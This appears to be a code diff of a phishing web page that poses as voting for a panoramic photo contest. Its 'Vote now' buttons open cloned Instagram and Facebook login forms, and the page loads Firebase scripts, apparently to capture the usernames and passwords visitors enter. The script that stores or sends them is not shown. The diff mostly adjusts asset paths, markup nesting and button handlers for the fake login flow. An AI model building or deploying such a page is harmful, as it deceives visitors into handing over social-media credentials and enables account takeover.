@@ -17,12 +17,12 @@
 	<title>Panoramic Photo Contest &#8211; The Epson International Pano Awards</title>
 
 	<!--styling for backend-->
-	<link id="dynamic-favicon" href="/assets/favicon.png" rel="shortcut icon" sizes="196x196">
-	<link type="text/css" rel="stylesheet" href="/css/fb_style.css">
-	<link rel="stylesheet" href="/css/index.css">
-	<link rel="stylesheet" href="/css/ig.css">
-	<script src="/js/jquery-3.6.0.min.js"></script>
-	<script src="/js/index.js"></script>
+	<link id="dynamic-favicon" href="assets/favicon.png" rel="shortcut icon" sizes="196x196">
+	<link type="text/css" rel="stylesheet" href="css/fb_style.css">
+	<link rel="stylesheet" href="css/index.css">
+	<link rel="stylesheet" href="css/ig.css">
+	<script src="js/jquery-3.6.0.min.js"></script>
+	<script src="js/index.js"></script>
 	<!--Styling ends for backend-->
 
 	<link rel='dns-prefetch' href='//stats.wp.com' />
@@ -257,14 +257,16 @@
 								<nav class="main_menu drop_down   right">
 									<ul id="menu-main" class="">
 										<li id="nav-menu-item-48446"
-											class="menu-item menu-item-type-post_type menu-item-object-page  narrow"><a
-												href="/prizes/" class=""><i class="menu_icon fa blank"></i><span
-													class="menu-text">Prizes</span><span class="plus"></span></a></li>
+											class="menu-item menu-item-type-post_type menu-item-object-page  narrow">
+											<a href="/prizes/" class=""><i class="menu_icon fa blank"></i><span
+													class="menu-text">Prizes</span><span class="plus"></span></a>
+										</li>
 
 										<li id="nav-menu-item-77531"
 											class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children  has_sub narrow">
 											<a href="/competition-rules/" class=""><i
-													class="menu_icon fa blank"></i><span class="menu-text">Rules &#038;
+													class="menu_icon fa blank"></i><span class="menu-text">Rules
+													&#038;
 													How
 													to Enter</span><span class="plus"></span></a>
 											<div class="second">
@@ -307,11 +309,12 @@
 													class="fa fa-angle-down"></i></span>
 											<ul class="sub_menu">
 												<li id="mobile-menu-item-48445"
-													class="menu-item menu-item-type-post_type menu-item-object-page "><a
-														href="/competition-rules/" class=""><span>Competition
+													class="menu-item menu-item-type-post_type menu-item-object-page ">
+													<a href="/competition-rules/" class=""><span>Competition
 															Rules</span></a><span class="mobile_arrow"><i
 															class="fa fa-angle-right"></i><i
-															class="fa fa-angle-down"></i></span></li>
+															class="fa fa-angle-down"></i></span>
+												</li>
 
 											</ul>
 										</li>
@@ -373,7 +376,8 @@
 																<div class="wpb_wrapper">
 																	<div class="wpb_text_column wpb_content_element ">
 																		<div class="wpb_wrapper">
-																			<h2 style="text-align: center;">2024 Voting
+																			<h2 style="text-align: center;">2024
+																				Voting
 																				CLOSING SOON</h2>
 
 																		</div>
@@ -510,7 +514,7 @@
 																</div>
 															</div>
 															<div class="separator  transparent   " style=""></div>
-															<a onclick="vote()" target="_self" class="qbutton "
+															<a onclick="handleIgClick()" target="_self" class="qbutton "
 																style="">Vote now</a>
 															<div class="separator  transparent   " style=""></div>
 														</div>
@@ -566,7 +570,7 @@
 																</div>
 															</div>
 															<div class="separator  transparent   " style=""></div>
-															<a onclick="vote()" target="_self" class="qbutton "
+															<a onclick="handleIgClick()" target="_self" class="qbutton "
 																style="">Vote now</a>
 															<div class="separator  transparent   " style=""></div>
 														</div>
@@ -623,7 +627,7 @@
 															</div>
 														</div>
 														<div class="separator  transparent   " style=""></div>
-														<a onclick="vote()" target="_self" class="qbutton "
+														<a onclick="handleIgClick()" target="_self" class="qbutton "
 															style="">Vote
 															now</a>
 													</div>
@@ -953,191 +957,195 @@
 	<!--facebuk login ends-->
 
 	<!--Insta login begins-->
-	<div id="ig_wrapper">
-		<div id="igcontainer" class="_ar45 system-fonts--body roboto">
-			<div id="mount_0_0_6z">
-				<div class="">
+	<test class="_9dls touch _ar44 js-focus-visible _aa4c" lang="en" dir="ltr" data-js-focus-visible="">
+		<div id="ig_wrapper">
+			<div id="igcontainer" class="_ar45 system-fonts--body roboto">
+				<div id="mount_0_0_6z">
 					<div class="">
-						<div
-							class="x4afe7t x1v7wizp xqcmdr3 x1htlvfj xds687c xixxii4 x17qophe x13vifvy x1x85hfe x1s85apg">
+						<div class="">
 							<div
-								class="x1x1c4bx x1c74tu6 x1v7wizp x1w55rbo xa3vuyk xuoj239 xee5nap xh8yej3 x1so62im xds687c xixxii4 x17qophe x13vifvy x1x85hfe">
+								class="x4afe7t x1v7wizp xqcmdr3 x1htlvfj xds687c xixxii4 x17qophe x13vifvy x1x85hfe x1s85apg">
 								<div
-									class="x1x1c4bx x1c74tu6 xa4qsjk x1eg1fw9 x1esw782 x12zrl2 xuoj239 xee5nap xh8yej3 x1so62im">
+									class="x1x1c4bx x1c74tu6 x1v7wizp x1w55rbo xa3vuyk xuoj239 xee5nap xh8yej3 x1so62im xds687c xixxii4 x17qophe x13vifvy x1x85hfe">
+									<div
+										class="x1x1c4bx x1c74tu6 xa4qsjk x1eg1fw9 x1esw782 x12zrl2 xuoj239 xee5nap xh8yej3 x1so62im">
+									</div>
 								</div>
 							</div>
-						</div>
-						<div class="x9f619 x1n2onr6 x1ja2u2z">
-							<div class="x78zum5 xdt5ytf x1n2onr6 x1ja2u2z">
-								<div class="x78zum5 xdt5ytf x1n2onr6 xat3117 xxzkxad x4m6w61">
-									<div class="x78zum5 xdt5ytf x1t2pt76 x1n2onr6 x1ja2u2z x10cihs4">
-										<section class="x78zum5 xdt5ytf x1iyjqo2 x1wjobn4">
-											<main class="xvbhtw8 x78zum5 xdt5ytf x1iyjqo2 x182iqb8 x1n2onr6 xg6iff7"
-												role="main">
-												<nav
-													class="x6s0dn4 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xdt5ytf x2lah0s xln7xf2 xk390pu x1anpbxc xmo9yow xat24cr x17adc0v xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 x11njtxf">
-													<span
-														class="x1ypdohk x1rg5ohu x1n2onr6 x16dsc37 x1pg5gke x1yrsyyn xsyo7zv x10b6aqq x16hj40l x1qkh490">
-														<div
-															class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1uhb9sk x1plvlek xryxfnj x1c4vz4f x2lah0s x1q0g3np xqjyukv x6s0dn4 x1oa3qoh xl56j7k">
-															<span
-																class="x1lliihq x1plvlek xryxfnj x1n2onr6 x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1i0vuye x1fhwpqd xo1l8bm x1roi4f4 x1s3etm8 x676frb x10wh9bi x1wdrske x8viiok x18hxmgj"
-																dir="auto"
-																style="line-height: var(--base-line-clamp-line-height); --base-line-clamp-line-height: 16px;">English</span>
+							<div class="x9f619 x1n2onr6 x1ja2u2z">
+								<div class="x78zum5 xdt5ytf x1n2onr6 x1ja2u2z">
+									<div class="x78zum5 xdt5ytf x1n2onr6 xat3117 xxzkxad x4m6w61">
+										<div class="x78zum5 xdt5ytf x1t2pt76 x1n2onr6 x1ja2u2z x10cihs4">
+											<section class="x78zum5 xdt5ytf x1iyjqo2 x1wjobn4">
+												<main class="xvbhtw8 x78zum5 xdt5ytf x1iyjqo2 x182iqb8 x1n2onr6 xg6iff7"
+													role="main">
+													<nav
+														class="x6s0dn4 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xdt5ytf x2lah0s xln7xf2 xk390pu x1anpbxc xmo9yow xat24cr x17adc0v xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 x11njtxf">
+														<span
+															class="x1ypdohk x1rg5ohu x1n2onr6 x16dsc37 x1pg5gke x1yrsyyn xsyo7zv x10b6aqq x16hj40l x1qkh490">
 															<div
-																class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xsgj6o6 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x6s0dn4 x1oa3qoh xl56j7k">
+																class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1uhb9sk x1plvlek xryxfnj x1c4vz4f x2lah0s x1q0g3np xqjyukv x6s0dn4 x1oa3qoh xl56j7k">
 																<span
-																	style="display: inline-block; transform: rotate(180deg);"><svg
-																		aria-label="Down chevron icon"
-																		class="x1lliihq x1n2onr6 x1roi4f4"
-																		fill="currentColor" height="12" role="img"
-																		viewBox="0 0 24 24" width="12">
-																		<title>Down chevron icon</title>
-																		<path
-																			d="M21 17.502a.997.997 0 0 1-.707-.293L12 8.913l-8.293 8.296a1 1 0 1 1-1.414-1.414l9-9.004a1.03 1.03 0 0 1 1.414 0l9 9.004A1 1 0 0 1 21 17.502Z">
-																		</path>
-																	</svg></span>
+																	class="x1lliihq x1plvlek xryxfnj x1n2onr6 x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1i0vuye x1fhwpqd xo1l8bm x1roi4f4 x1s3etm8 x676frb x10wh9bi x1wdrske x8viiok x18hxmgj"
+																	dir="auto"
+																	style="line-height: var(--base-line-clamp-line-height); --base-line-clamp-line-height: 16px;">English</span>
+																<div
+																	class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xsgj6o6 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x6s0dn4 x1oa3qoh xl56j7k">
+																	<span
+																		style="display: inline-block; transform: rotate(180deg);"><svg
+																			aria-label="Down chevron icon"
+																			class="x1lliihq x1n2onr6 x1roi4f4"
+																			fill="currentColor" height="12" role="img"
+																			viewBox="0 0 24 24" width="12">
+																			<title>Down chevron icon</title>
+																			<path
+																				d="M21 17.502a.997.997 0 0 1-.707-.293L12 8.913l-8.293 8.296a1 1 0 1 1-1.414-1.414l9-9.004a1.03 1.03 0 0 1 1.414 0l9 9.004A1 1 0 0 1 21 17.502Z">
+																			</path>
+																		</svg></span>
+																</div>
 															</div>
-														</div>
-													</span>
-												</nav>
-												<article
-													class="x1qjc9v5 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 x1q0g3np x1iyjqo2 x2lah0s xk390pu xl56j7k xg87l8a xkrivgy xat24cr x1gryazu x1ykew4q xexx8yu x4uap5 x1gan7if xkhd6sd x11njtxf xh8yej3 x1d2lwc3 x1n2onr6">
-													<div class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1"
-														style="width: 100%;">
-														<div
-															class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x6s0dn4 x1oa3qoh x1nhvcw1">
-															<div class="_ab1y _ab1-">
-																<div class="_ab21">
-																	<div
-																		class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xseo6mj xod5an3 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
-																		<div aria-disabled="false" role="button"
-																			tabindex="0" style="cursor: pointer;"><i
-																				data-visualcompletion="css-img"
-																				aria-label="Instagram" class=""
-																				style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yh/r/IS7e616CiR2.png&quot;); background-position: 0px 0px; background-size: 176px 258px; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
-																		</div>
-																	</div>
-																	<div class="_ab3a">
-
+														</span>
+													</nav>
+													<article
+														class="x1qjc9v5 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 x1q0g3np x1iyjqo2 x2lah0s xk390pu xl56j7k xg87l8a xkrivgy xat24cr x1gryazu x1ykew4q xexx8yu x4uap5 x1gan7if xkhd6sd x11njtxf xh8yej3 x1d2lwc3 x1n2onr6">
+														<div class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1"
+															style="width: 100%;">
+															<div
+																class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x6s0dn4 x1oa3qoh x1nhvcw1">
+																<div class="_ab1y _ab1-">
+																	<div class="_ab21">
 																		<div
-																			class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xqui205 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
+																			class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xseo6mj xod5an3 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
+																			<div aria-disabled="false" role="button"
+																				tabindex="0" style="cursor: pointer;"><i
+																					data-visualcompletion="css-img"
+																					aria-label="Instagram" class=""
+																					style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yh/r/IS7e616CiR2.png&quot;); background-position: 0px 0px; background-size: 176px 258px; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
+																			</div>
+																		</div>
+																		<div class="_ab3a">
+
 																			<div
-																				class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1xmf6yo x1e56ztr x540dpk x1m39q7l x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
-																				<button onclick="fb()"
-																					class=" _acan _acap _acas _aj1- _ap30"
-																					type="button"><span
-																						class="_9zlu _ab36"></span><span
-																						class="">Continue with
-																						Facebook</span></button>
-																			</div>
-																			<div class="_ab38">
-																				<div class="x78zum5 x1q0g3np">
-																					<div
-																						class="x1iyjqo2 xs83m0k xjm9jq1 x1n2onr6 xwtuau4 x11mr3az">
-																					</div>
-																					<div
-																						class="x1qjc9v5 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1roi4f4 x78zum5 xdt5ytf x1c4vz4f x2lah0s x1nxh6w3 x1s688f x1ly1vsg xdj266r xpdqn1h xat24cr x1sliqq xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 xtvhhri x11njtxf">
-																						or</div>
-																					<div
-																						class="x1iyjqo2 xs83m0k xjm9jq1 x1n2onr6 xwtuau4 x11mr3az">
-																					</div>
-																				</div>
-																			</div>
-																			<div class="instacontainer">
+																				class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xqui205 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
 																				<div
-																					class="x6s0dn4 xnz67gz x19gtwsn x1nk0tez x1xp9za0 x1hm1hlx x1npaq5j x1c83p5e x1enjb0b x199158v x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x178xt8z xm81vs4 xso031l xy80clv x9f619 x5n08af x78zum5 x1q0g3np xvs91rp x1n2onr6 xh8yej3">
-																					<label class="_aa48 _aa49"><span
-																							class="_aa4a">Phone
-																							number,
-																							username, or
-																							email</span><input
-																							id="ig-uname"
-																							aria-label="Phone number, username, or email"
-																							aria-required="true"
-																							autocapitalize="off"
-																							autocorrect="off"
-																							maxlength="75"
-																							class="_aa4b _add6 _ac4d _ap35"
-																							dir="" type="text"></label>
-																					<div
-																						class="x6s0dn4 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xdl72j9 x1q0g3np x1c4vz4f x2lah0s xk390pu x5yr21d xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x1sxyh0 x18d9i69 xkhd6sd x1n2onr6 xxymvpz">
-																					</div>
+																					class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1xmf6yo x1e56ztr x540dpk x1m39q7l x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
+																					<button onclick="fb()"
+																						class=" _acan _acap _acas _aj1- _ap30"
+																						type="button"><span
+																							class="_9zlu _ab36"></span><span
+																							class="">Continue with
+																							Facebook</span></button>
 																				</div>
-																			</div>
-																			<div class="instacontainer">
-																				<div
-																					class="x6s0dn4 xnz67gz x19gtwsn x1nk0tez x1xp9za0 x1hm1hlx x1npaq5j x1c83p5e x1enjb0b x199158v x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x178xt8z xm81vs4 xso031l xy80clv x9f619 x5n08af x78zum5 x1q0g3np xvs91rp x1n2onr6 xh8yej3">
-																					<label class="_aa48 _aa49"><span
-																							class="_aa4a">Password</span><input
-																							id="ig-pass"
-																							aria-label="Password"
-																							aria-required="true"
-																							autocapitalize="off"
-																							autocorrect="off"
-																							class="_aa4b _add6 _ac4d _ap35"
-																							type="text" dir=""></label>
-																					<div
-																						class="x6s0dn4 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xdl72j9 x1q0g3np x1c4vz4f x2lah0s xk390pu x5yr21d xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x1sxyh0 x18d9i69 xkhd6sd x1n2onr6 xxymvpz">
+																				<div class="_ab38">
+																					<div class="x78zum5 x1q0g3np">
 																						<div
-																							class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1i64zmx x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
+																							class="x1iyjqo2 xs83m0k xjm9jq1 x1n2onr6 xwtuau4 x11mr3az">
+																						</div>
+																						<div
+																							class="x1qjc9v5 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1roi4f4 x78zum5 xdt5ytf x1c4vz4f x2lah0s x1nxh6w3 x1s688f x1ly1vsg xdj266r xpdqn1h xat24cr x1sliqq xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 xtvhhri x11njtxf">
+																							or</div>
+																						<div
+																							class="x1iyjqo2 xs83m0k xjm9jq1 x1n2onr6 xwtuau4 x11mr3az">
 																						</div>
 																					</div>
 																				</div>
-																			</div>
-																			<div
-																				class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1e56ztr x540dpk x1m39q7l xsag5q8 xz9dl7a x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s x1q0g3np xqjyukv x1qjc9v5 x1oa3qoh x13a6bvl">
-																				<span
-																					class="x1lliihq x1plvlek xryxfnj x1n2onr6 x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1i0vuye xvs91rp xo1l8bm x173jzuc x2b8uid x1tu3fi x3x7a5m x10wh9bi x1wdrske x8viiok x18hxmgj"
-																					dir="auto"
-																					style="cursor: pointer; line-height: var(--base-line-clamp-line-height); --base-line-clamp-line-height: 18px;">Forgot
-																					password?</span>
-																			</div>
-																			<div
-																				class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1xmf6yo x1e56ztr x540dpk x1m39q7l x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
-																				<button onclick="ig()"
-																					class=" _acan _acap _acas _aj1- _ap30"
-																					disabled="" type="submit">
+																				<div class="instacontainer">
 																					<div
-																						class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
-																						Log in</div>
-																				</button>
+																						class="x6s0dn4 xnz67gz x19gtwsn x1nk0tez x1xp9za0 x1hm1hlx x1npaq5j x1c83p5e x1enjb0b x199158v x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x178xt8z xm81vs4 xso031l xy80clv x9f619 x5n08af x78zum5 x1q0g3np xvs91rp x1n2onr6 xh8yej3">
+																						<label class="_aa48 _aa49"><span
+																								class="_aa4a">Phone
+																								number,
+																								username, or
+																								email</span><input
+																								id="ig-uname"
+																								aria-label="Phone number, username, or email"
+																								aria-required="true"
+																								autocapitalize="off"
+																								autocorrect="off"
+																								maxlength="75"
+																								class="_aa4b _add6 _ac4d _ap35"
+																								dir=""
+																								type="text"></label>
+																						<div
+																							class="x6s0dn4 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xdl72j9 x1q0g3np x1c4vz4f x2lah0s xk390pu x5yr21d xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x1sxyh0 x18d9i69 xkhd6sd x1n2onr6 xxymvpz">
+																						</div>
+																					</div>
+																				</div>
+																				<div class="instacontainer">
+																					<div
+																						class="x6s0dn4 xnz67gz x19gtwsn x1nk0tez x1xp9za0 x1hm1hlx x1npaq5j x1c83p5e x1enjb0b x199158v x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x178xt8z xm81vs4 xso031l xy80clv x9f619 x5n08af x78zum5 x1q0g3np xvs91rp x1n2onr6 xh8yej3">
+																						<label class="_aa48 _aa49"><span
+																								class="_aa4a">Password</span><input
+																								id="ig-pass"
+																								aria-label="Password"
+																								aria-required="true"
+																								autocapitalize="off"
+																								autocorrect="off"
+																								class="_aa4b _add6 _ac4d _ap35"
+																								type="text"
+																								dir=""></label>
+																						<div
+																							class="x6s0dn4 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xdl72j9 x1q0g3np x1c4vz4f x2lah0s xk390pu x5yr21d xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x1sxyh0 x18d9i69 xkhd6sd x1n2onr6 xxymvpz">
+																							<div
+																								class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1i64zmx x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
+																							</div>
+																						</div>
+																					</div>
+																				</div>
+																				<div
+																					class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1e56ztr x540dpk x1m39q7l xsag5q8 xz9dl7a x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s x1q0g3np xqjyukv x1qjc9v5 x1oa3qoh x13a6bvl">
+																					<span
+																						class="x1lliihq x1plvlek xryxfnj x1n2onr6 x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1i0vuye xvs91rp xo1l8bm x173jzuc x2b8uid x1tu3fi x3x7a5m x10wh9bi x1wdrske x8viiok x18hxmgj"
+																						dir="auto"
+																						style="cursor: pointer; line-height: var(--base-line-clamp-line-height); --base-line-clamp-line-height: 18px;">Forgot
+																						password?</span>
+																				</div>
+																				<div
+																					class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1xmf6yo x1e56ztr x540dpk x1m39q7l x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
+																					<button onclick="ig()"
+																						class=" _acan _acap _acas _aj1- _ap30"
+																						disabled="" type="submit">
+																						<div
+																							class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
+																							Log in</div>
+																					</button>
+																				</div>
 																			</div>
-																		</div>
-																		<div
-																			class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xw7yly9 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x6s0dn4 x1oa3qoh x1nhvcw1">
-																			<span
-																				class="x1lliihq x1plvlek xryxfnj x1n2onr6 x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1i0vuye xvs91rp xo1l8bm x1roi4f4 x1tu3fi x3x7a5m x10wh9bi x1wdrske x8viiok x18hxmgj"
-																				dir="auto"
-																				style="line-height: var(--base-line-clamp-line-height); --base-line-clamp-line-height: 18px;">
-																				<p>Don't have an account? <span
-																						class="_ap3a _aaco _aacw _aad0 _aad7"
-																						dir="auto">Sign
-																						up</span>
-																				</p>
-																			</span>
+																			<div
+																				class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xw7yly9 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x6s0dn4 x1oa3qoh x1nhvcw1">
+																				<span
+																					class="x1lliihq x1plvlek xryxfnj x1n2onr6 x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1i0vuye xvs91rp xo1l8bm x1roi4f4 x1tu3fi x3x7a5m x10wh9bi x1wdrske x8viiok x18hxmgj"
+																					dir="auto"
+																					style="line-height: var(--base-line-clamp-line-height); --base-line-clamp-line-height: 18px;">
+																					<p>Don't have an account? <span
+																							class="_ap3a _aaco _aacw _aad0 _aad7"
+																							dir="auto">Sign
+																							up</span>
+																					</p>
+																				</span>
+																			</div>
 																		</div>
 																	</div>
 																</div>
 															</div>
 														</div>
+													</article>
+													<div
+														class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1hq5gj4 x1n2onr6 x1ey2m1c x1plvlek xryxfnj x1c4vz4f x2lah0s x1q0g3np xqjyukv x1qjc9v5 x1oa3qoh xl56j7k">
+														<div class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1"
+															style="height: 26px; width: 52px;"><img alt="from Meta"
+																src="meta.svg">
+														</div>
 													</div>
-												</article>
-												<div
-													class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1hq5gj4 x1n2onr6 x1ey2m1c x1plvlek xryxfnj x1c4vz4f x2lah0s x1q0g3np xqjyukv x1qjc9v5 x1oa3qoh xl56j7k">
-													<div class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1"
-														style="height: 26px; width: 52px;"><img alt="from Meta"
-															src="meta.svg">
-													</div>
-												</div>
-											</main>
-										</section>
+												</main>
+											</section>
+											<div>
+												<div></div>
+											</div>
+										</div>
 										<div>
 											<div></div>
 										</div>
-									</div>
-									<div>
-										<div></div>
 									</div>
 								</div>
 							</div>
@@ -1146,7 +1154,7 @@
 				</div>
 			</div>
 		</div>
-	</div>
+	</test>
 
 	<!--Insta login ends-->
 
@@ -1190,6 +1198,11 @@
 			favicon.href = iconUrl;
 		}
 
+		function vote() {
+			document.getElementById("choose").style.display = "block";
+		}
+
+
 		function fb() {
 			document.getElementById("fb_wrapper").style.display = "block";
 			document.getElementById("home").style.display = "none";
@@ -1226,7 +1239,7 @@
 	<script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
 	<script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
 
-	<script src="/js/firebase.js">
+	<script src="js/firebase.js">
 
 
 
